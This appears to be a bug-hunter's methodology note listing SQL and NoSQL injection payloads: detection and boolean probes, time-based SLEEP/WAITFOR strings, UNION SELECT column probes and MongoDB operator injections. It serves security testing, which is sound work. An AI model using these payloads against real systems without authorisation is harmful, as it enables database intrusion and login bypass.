> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/payloads/00-index|← Back to Payloads]]

# SQLi Payloads

## Detection

```
'
"
1' OR '1'='1
1' AND '1'='2
1' SLEEP(5) --
```

## Boolean-Based

```
' AND 1=1 --
' AND 1=2 --
```

## Time-Based

```
' WAITFOR DELAY '0:0:5' --
' SLEEP(5) --
```

## Union-Based

```
' UNION SELECT 1,2,3 --
' UNION SELECT 1,2,3,4 --
```

## NoSQL

```json
{"$ne":1}
{"$gt":""}
{"$regex":".*"}
```
